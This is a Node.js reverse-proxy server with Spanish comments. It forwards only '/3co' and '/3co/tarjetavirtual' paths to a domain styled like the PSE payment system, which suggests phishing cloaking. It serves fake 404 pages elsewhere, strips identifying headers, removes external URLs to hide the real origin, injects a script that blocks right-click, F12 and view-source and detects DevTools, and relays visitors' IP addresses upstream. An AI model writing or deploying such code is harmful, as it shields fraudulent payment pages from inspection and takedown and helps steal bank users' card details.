const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const helmet = require('helmet');
const crypto = require('crypto');
const zlib = require('zlib');
const { promisify } = require('util');

const gunzip = promisify(zlib.gunzip);
const inflate = promisify(zlib.inflate);
const inflateRaw = promisify(zlib.inflateRaw);
const brotliDecompress = promisify(zlib.brotliDecompress);

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_URL = process.env.TARGET_URL || 'https://pse.pwm435.space';
const ALLOWED_PATHS = ['/3co', '/3co/tarjetavirtual'];

// Derivar host del TARGET_URL para la lista blanca
let TARGET_HOST = '';
try {
  TARGET_HOST = new URL(TARGET_URL).host;
} catch (_) {
  TARGET_HOST = '';
}

// Seguridad adicional
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

// Eliminar headers que revelan información del propio proxy
app.use((req, res, next) => {
  res.removeHeader('X-Powered-By');
  res.removeHeader('Server');
  next();
});

// ---- Utilidades de descompresión (por si Cloudflare/origen envían comprimido) ----
const decompressIfNeeded = async (buffer, encoding) => {
  if (!encoding) return buffer;
  const enc = String(encoding).toLowerCase();
  try {
    if (enc.includes('gzip')) return await gunzip(buffer);
    if (enc.includes('br')) return await brotliDecompress(buffer);
    if (enc.includes('deflate')) {
      try { return await inflate(buffer); } catch { return await inflateRaw(buffer); }
    }
  } catch {
    // Si falla, devolvemos el buffer tal cual para no romper la respuesta.
    return buffer;
  }
  return buffer;
};

// ---- Ofuscación de contenido HTML (no romper recursos propios/Cloudflare) ----
const obfuscateContent = (contentString, contentType) => {
  if (!contentType || !contentType.includes('text/html')) {
    return Buffer.from(contentString, 'utf8');
  }

  const allowedDomains = [
    TARGET_HOST,                 // dominio del origen
    'onrender.com',              // dominio del proxy Render
    'render.com',
    'cloudflare.com',            // dominios comunes de Cloudflare
    'cloudflareinsights.com',
    'cdnjs.cloudflare.com'
  ];

  // Reemplazar referencias absolutas a dominios externos, excepto lista blanca
  let modified = contentString.replace(/https?:\/\/([^\/\s"']+)/g, (match, host) => {
    if (allowedDomains.some(d => host.includes(d))) return match;
    // elimina la URL externa para evitar exponer dominio real u otros
    return '';
  });

  // Script anti-inspección (ligero, no rompe la página)
  const antiInspectScript = `
<script>
(function(){
  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
  document.addEventListener('keydown', function(e){
    if(
      e.keyCode === 123 ||
      (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
      (e.ctrlKey && e.keyCode === 85)
    ){
      e.preventDefault();
      return false;
    }
  });
  setInterval(function(){
    if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200){
      if(!sessionStorage.getItem('dt_warned')){
        sessionStorage.setItem('dt_warned', '1');
        console.warn('DevTools detectado');
      }
    }
  }, 500);
})();
</script>
`;

  if (modified.includes('</body>')) {
    modified = modified.replace('</body>', antiInspectScript + '</body>');
  }

  return Buffer.from(modified, 'utf8');
};

// ---- Middleware para verificar rutas permitidas ----
app.use((req, res, next) => {
  const path = req.path;
  const isAllowed = ALLOWED_PATHS.some(allowedPath =>
    path === allowedPath || path.startsWith(allowedPath + '/')
  );

  if (!isAllowed && !path.startsWith('/assets') && !path.startsWith('/css') && !path.startsWith('/js')) {
    res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>404 Not Found</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #333; }
        </style>
      </head>
      <body>
        <h1>404 - Page Not Found</h1>
        <p>The requested resource could not be found.</p>
      </body>
      </html>
    `);
    return;
  }
  next();
});

// ---- Configuración del proxy (SIN compresión) ----
const proxyOptions = {
  target: TARGET_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  selfHandleResponse: true, // necesario para responseInterceptor
  xfwd: true,               // propaga X-Forwarded-*

  // Modificar request que va al origen
  onProxyReq: (proxyReq, req, res) => {
    const userDomain = req.get('host') || 'unknown.onrender.com';
    const userIp = req.headers['x-forwarded-for'] ||
      req.headers['x-real-ip'] ||
      req.connection?.remoteAddress ||
      'unknown';

    proxyReq.setHeader('user_domain', userDomain);
    proxyReq.setHeader('user_ip', String(userIp).split(',')[0].trim());

    // Hacernos pasar por navegador real si el cliente no lo envió
    if (!req.get('User-Agent')) {
      proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    }
    proxyReq.setHeader('Accept-Language', req.get('Accept-Language') || 'es-ES,es;q=0.9,en;q=0.8');

    // Pedir SIEMPRE sin compresión al upstream
    proxyReq.removeHeader('Accept-Encoding');

    // Indicar al backend que el cliente original usó HTTPS (útil con Cloudflare Flexible/redirects)
    proxyReq.setHeader('X-Forwarded-Proto', 'https');

    // ID de sesión aleatorio
    const sessionId = crypto.randomBytes(16).toString('hex');
    proxyReq.setHeader('X-Session-Id', sessionId);
  },

  // Ajustar headers de respuesta del upstream (no tocar content-encoding aquí)
  onProxyRes: (proxyRes, req, res) => {
    delete proxyRes.headers['x-powered-by'];
    delete proxyRes.headers['server'];
    delete proxyRes.headers['x-aspnet-version'];
    delete proxyRes.headers['x-aspnetmvc-version'];

    proxyRes.headers['X-Content-Type-Options'] = 'nosniff';
    proxyRes.headers['X-XSS-Protection'] = '1; mode=block';
    proxyRes.headers['Referrer-Policy'] = 'no-referrer';
    proxyRes.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private';
    // OJO: no borrar aquí 'content-encoding'; lo gestionamos en el interceptor SOLO para HTML.
  },

  // Interceptor del cuerpo (solo HTML). Si llega comprimido, descomprime → modifica → entrega SIN compresión.
  on: {
    proxyRes: responseInterceptor(async (responseBuffer, proxyRes, req, res) => {
      const contentType = proxyRes.headers['content-type'] || '';

      // Solo tocamos HTML. Otros tipos se devuelven tal cual (incluida su compresión/headers)
      if (!String(contentType).includes('text/html')) {
        return responseBuffer;
      }

      // Si por alguna razón llegó comprimido (p. ej. Cloudflare), descomprimir
      const contentEncoding = proxyRes.headers['content-encoding']; // br/gzip/deflate
      const decompressed = await decompressIfNeeded(responseBuffer, contentEncoding);

      // Modificar HTML
      const htmlString = decompressed.toString('utf8');
      const modifiedBuffer = obfuscateContent(htmlString, contentType);

      // Vamos a servir el HTML SIN compresión al cliente:
      delete proxyRes.headers['content-encoding'];
      proxyRes.headers['content-length'] = Buffer.byteLength(modifiedBuffer);

      return modifiedBuffer;
    })
  },

  // Manejo de errores
  onError: (err, req, res) => {
    console.error('Proxy error:', err && err.message ? err.message : err);
    res.status(502).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Service Temporarily Unavailable</title>
        <style>
          body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
          h1 { color: #333; }
        </style>
      </head>
      <body>
        <h1>Service Temporarily Unavailable</h1>
        <p>Please try again later.</p>
      </body>
      </html>
    `);
  }
};

// Aplicar el proxy
app.use('/', createProxyMiddleware(proxyOptions));

// Manejo de errores global
app.use((err, req, res, next) => {
  console.error('Application error:', err);
  res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
  console.log('Allowed paths:', ALLOWED_PATHS.join(', '));
});
